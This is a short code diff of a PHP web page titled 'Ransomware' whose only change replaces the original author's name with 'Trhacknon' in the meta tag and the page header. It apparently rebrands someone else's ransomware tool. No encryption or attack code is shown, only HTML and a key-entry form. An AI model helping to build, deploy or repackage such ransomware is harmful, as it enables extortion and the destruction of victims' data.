@@ -136,7 +136,7 @@ if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) 
 		<title>Ransomware</title>
 		<meta name="description" content="Ransomware written in PHP.">
 		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
-		<meta name="author" content="Ivan Šincek">
+		<meta name="author" content="Trhacknon">
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<style>
 			html {
@@ -250,7 +250,7 @@ if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) 
 			<div class="layout">
 				<header>
 					<h1 class="title">Ransomware</h1>
-					<p>Made by Ivan Šincek</p>
+					<p>Made by Trhacknon</p>
 				</header>
 				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
 					<label for="key">Encryption Key</label>
